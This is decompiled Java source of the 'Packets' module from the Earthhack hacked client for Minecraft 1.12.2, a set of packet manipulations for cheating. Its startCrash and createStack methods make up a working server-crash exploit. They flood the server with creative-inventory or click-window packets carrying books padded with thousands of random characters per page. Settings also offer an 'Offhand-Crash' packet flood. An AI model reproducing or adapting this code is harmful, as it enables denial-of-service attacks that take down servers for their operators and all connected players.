//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\aesthetical\Documents\Development\Tools\Minecraft-Clients\1.12.2 mappings"!

// 
// Decompiled by Procyon v0.6-prerelease
// 

package me.earth.earthhack.impl.modules.misc.packets;

import me.earth.earthhack.api.module.*;
import me.earth.earthhack.impl.modules.misc.packets.util.*;
import net.minecraft.util.math.*;
import net.minecraft.block.state.*;
import java.util.concurrent.atomic.*;
import me.earth.earthhack.api.module.util.*;
import me.earth.earthhack.api.setting.settings.*;
import java.util.concurrent.*;
import me.earth.earthhack.api.event.bus.api.*;
import me.earth.earthhack.api.setting.*;
import me.earth.earthhack.impl.gui.visibility.*;
import me.earth.earthhack.impl.util.client.*;
import me.earth.earthhack.api.module.data.*;
import me.earth.earthhack.impl.managers.thread.scheduler.*;
import me.earth.earthhack.impl.managers.*;
import net.minecraft.inventory.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import net.minecraft.item.*;
import net.minecraft.init.*;
import net.minecraft.nbt.*;
import java.util.*;
import me.earth.earthhack.api.setting.event.*;

public class Packets extends Module
{
    protected static final Random RANDOM;
    protected static final String SALT;
    protected final Setting<PacketPages> page;
    protected final Setting<Boolean> fastTransactions;
    protected final Setting<Boolean> fastTeleports;
    protected final Setting<Boolean> asyncTeleports;
    protected final Setting<Boolean> fastDestroyEntities;
    protected final Setting<Boolean> fastSetDead;
    protected final Setting<Boolean> fastDeath;
    protected final Setting<Boolean> fastHeadLook;
    protected final Setting<Boolean> fastEntities;
    protected final Setting<Boolean> fastEntityTeleport;
    protected final Setting<Boolean> cancelEntityTeleport;
    protected final Setting<Boolean> fastVelocity;
    protected final Setting<Boolean> cancelVelocity;
    protected final Setting<Boolean> safeHeaders;
    protected final Setting<Boolean> noHandChange;
    protected final Setting<Boolean> fastCollect;
    protected final Setting<Boolean> miniTeleports;
    protected final Setting<Boolean> noBookBan;
    protected final Setting<Boolean> fastBlockStates;
    protected final Setting<Boolean> fastSetSlot;
    protected final Setting<Boolean> ccResources;
    protected final Setting<Boolean> noSizeKick;
    protected final Setting<BookCrashMode> bookCrash;
    protected final Setting<Integer> bookDelay;
    public Setting<Integer> bookLength;
    protected final Setting<Integer> offhandCrashes;
    protected final Map<BlockPos, IBlockState> stateMap;
    protected final AtomicBoolean crashing;
    protected String pages;
    
    public Packets() {
        super("Packets", Category.Misc);
        this.page = this.register(new EnumSetting("Page", PacketPages.Safe));
        this.fastTransactions = this.register(new BooleanSetting("Transactions", true));
        this.fastTeleports = this.register(new BooleanSetting("Teleports", true));
        this.asyncTeleports = this.register(new BooleanSetting("Async-Teleports", false));
        this.fastDestroyEntities = this.register(new BooleanSetting("Fast-Destroy", true));
        this.fastSetDead = this.register(new BooleanSetting("SoundRemove", true));
        this.fastDeath = this.register(new BooleanSetting("Fast-Death", true));
        this.fastHeadLook = this.register(new BooleanSetting("Fast-HeadLook", false));
        this.fastEntities = this.register(new BooleanSetting("Fast-Entity", true));
        this.fastEntityTeleport = this.register(new BooleanSetting("Fast-EntityTeleport", true));
        this.cancelEntityTeleport = this.register(new BooleanSetting("Cancel-EntityTeleport", true));
        this.fastVelocity = this.register(new BooleanSetting("Fast-Velocity", true));
        this.cancelVelocity = this.register(new BooleanSetting("Cancel-Velocity", true));
        this.safeHeaders = this.register(new BooleanSetting("Safe-Headers", true));
        this.noHandChange = this.register(new BooleanSetting("NoHandChange", false));
        this.fastCollect = this.register(new BooleanSetting("Fast-Collect", false));
        this.miniTeleports = this.register(new BooleanSetting("Mini-Teleports", true));
        this.noBookBan = this.register(new BooleanSetting("AntiBookBan", false));
        this.fastBlockStates = this.register(new BooleanSetting("Fast-BlockStates", false));
        this.fastSetSlot = this.register(new BooleanSetting("Fast-SetSlot", false));
        this.ccResources = this.register(new BooleanSetting("CC-Resources", false));
        this.noSizeKick = this.register(new BooleanSetting("No-SizeKick", false));
        this.bookCrash = this.register(new EnumSetting("BookCrash", BookCrashMode.None));
        this.bookDelay = this.register(new NumberSetting("Book-Delay", 5, 0, 500));
        this.bookLength = this.register(new NumberSetting("Book-Length", 600, 100, 8192));
        this.offhandCrashes = this.register(new NumberSetting("Offhand-Crash", 0, 0, 5000));
        this.crashing = new AtomicBoolean();
        this.stateMap = new ConcurrentHashMap<BlockPos, IBlockState>();
        this.listeners.add(new ListenerCollect(this));
        this.listeners.add(new ListenerConfirmTransaction(this));
        this.listeners.add(new ListenerBlockState(this));
        this.listeners.add(new ListenerBlockMulti(this));
        this.listeners.add(new ListenerPosLook(this));
        this.listeners.add(new ListenerSound(this));
        this.listeners.add(new ListenerTick(this));
        this.listeners.add(new ListenerWorldClient(this));
        this.listeners.add(new ListenerDisconnect(this));
        this.listeners.add(new ListenerDeath(this));
        this.listeners.add(new ListenerVelocity(this));
        this.listeners.add(new ListenerEntityTeleport(this));
        this.listeners.add(new ListenerDestroyEntities(this));
        this.listeners.add(new ListenerPlayerListHeader(this));
        this.listeners.add(new ListenerHeldItemChange(this));
        this.listeners.add(new ListenerSetSlot(this));
        this.listeners.add(new ListenerHeadLook(this));
        this.listeners.addAll(new ListenerEntity(this).getListeners());
        new PageBuilder<PacketPages>(this, this.page).addPage(v -> v == PacketPages.Safe, this.fastTransactions, this.miniTeleports).addPage(v -> v == PacketPages.Danger, this.noBookBan, this.offhandCrashes).register(Visibilities.VISIBILITY_MANAGER);
        final SimpleData data = new SimpleData(this, "Exploits with packets.");
        data.register(this.page, "-Safe all Settings that are safe to use.\n-Danger all settings that might kick.");
        data.register(this.bookCrash, "Crashes the server with \"Book-Packets\".");
        data.register(this.fastTransactions, "Speeds up ConfirmTransaction packets a tiny bit.");
        data.register(this.fastTeleports, "Speeds up ConfirmTeleport packets a tiny bit.");
        data.register(this.asyncTeleports, "Might cause issues with movement and other modules.");
        data.register(this.fastDestroyEntities, "Makes Entities die faster.");
        data.register(this.fastDeath, "Makes Entities die faster.");
        data.register(this.fastEntities, "Makes Entities update faster.");
        data.register(this.fastEntityTeleport, "Makes Entities update faster.");
        data.register(this.cancelEntityTeleport, "Should be on. For Debugging.");
        data.register(this.fastVelocity, "Applies Velocity faster.");
        data.register(this.cancelVelocity, "Same as Cancel-EntityTeleport.");
        data.register(this.noHandChange, "Prevents the server from changing your hand");
        data.register(this.ccResources, "Only for Crystalpvp.cc and their current ResourcePack patch. not recommended on other servers.");
        data.register(this.safeHeaders, "Fixes a bug in Mojangs code that could crash you.");
        data.register(this.miniTeleports, "Allows you to see when Entities move minimally.");
        data.register(this.fastSetDead, "Speeds up SoundRemove a bit.");
        data.register(this.noBookBan, "Only turn on if you are bookbanned. Can cause issues otherwise.");
        data.register(this.bookDelay, "Delay between 2 \"Book-Packets\".");
        data.register(this.offhandCrashes, "Packets to send per tick. A value of 0 means Offhand-Crash is off.");
        data.register(this.noSizeKick, "Won't kick you for badly sized packets. This can cause weird stuff to happen.");
        this.setData(data);
        this.fastBlockStates.addObserver(e -> {
            if (!e.getValue()) {
                Scheduler.getInstance().schedule(() -> {
                    if (!this.fastBlockStates.getValue()) {
                        this.stateMap.clear();
                    }
                });
            }
        });
    }
    
    @Override
    protected void onLoad() {
        this.bookCrash.setValue(BookCrashMode.None);
        this.offhandCrashes.setValue(0);
        this.pages = this.genRandomString(this.bookLength.getValue());
    }
    
    @Override
    public String getDisplayInfo() {
        String result = null;
        if (this.bookCrash.getValue() != BookCrashMode.None) {
            result = "§cBookCrash";
            if (this.offhandCrashes.getValue() != 0) {
                result += ", Offhand";
            }
        }
        else if (this.offhandCrashes.getValue() != 0) {
            result = "§cOffhand";
        }
        return result;
    }
    
    public boolean isNoKickActive() {
        return this.isEnabled() && this.noSizeKick.getValue();
    }
    
    public boolean areCCResourcesActive() {
        return this.isEnabled() && this.ccResources.getValue();
    }
    
    public boolean areMiniTeleportsActive() {
        return this.isEnabled() && this.miniTeleports.getValue();
    }
    
    public boolean isNoBookBanActive() {
        return this.isEnabled() && this.noBookBan.getValue();
    }
    
    public void startCrash() {
        this.crashing.set(true);
        Managers.THREAD.submit(() -> {
            try {
                final ItemStack stack = this.createStack();
                while (this.isEnabled() && this.bookCrash.getValue() != BookCrashMode.None && Packets.mc.player != null) {
                    Object packet = null;
                    switch (this.bookCrash.getValue()) {
                        case None: {
                            this.crashing.set(false);
                            return;
                        }
                        case Creative: {
                            packet = new CPacketCreativeInventoryAction(0, stack);
                            break;
                        }
                        case ClickWindow:
                        case Console: {
                            packet = new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, stack, (short)0);
                            break;
                        }
                    }
                    if (packet != null) {
                        Packets.mc.player.connection.sendPacket((Packet)packet);
                    }
                    Thread.sleep(this.bookDelay.getValue());
                }
            }
            catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
            finally {
                this.crashing.set(false);
            }
        });
    }
    
    protected ItemStack createStack() {
        final ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagList list = new NBTTagList();
        final NBTTagCompound tag = new NBTTagCompound();
        if (this.bookCrash.getValue() == BookCrashMode.Console) {
            if (this.pages.length() != 8192) {
                this.pages = this.genRandomString(8192);
                this.bookLength.setValue(8192);
                this.bookDelay.setValue(225);
            }
        }
        else if (this.pages.length() != this.bookLength.getValue()) {
            this.pages = this.genRandomString(this.bookLength.getValue());
        }
        for (int i = 0; i < 50; ++i) {
            list.appendTag((NBTBase)new NBTTagString(this.pages));
        }
        tag.setString("author", Packets.mc.getSession().getUsername());
        tag.setString("title", "\n CrashBook \n");
        tag.setTag("pages", (NBTBase)list);
        stack.setTagInfo("pages", (NBTBase)list);
        stack.setTagCompound(tag);
        return stack;
    }
    
    private String genRandomString(final Integer length) {
        final StringBuilder salt = new StringBuilder();
        while (salt.length() < length) {
            final int index = (int)(Packets.RANDOM.nextFloat() * Packets.SALT.length());
            salt.append(Packets.SALT.charAt(index));
        }
        return salt.toString();
    }
    
    public Map<BlockPos, IBlockState> getStateMap() {
        if (this.fastBlockStates.getValue()) {
            return this.stateMap;
        }
        return Collections.emptyMap();
    }
    
    static {
        RANDOM = new Random();
        SALT = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    }
}
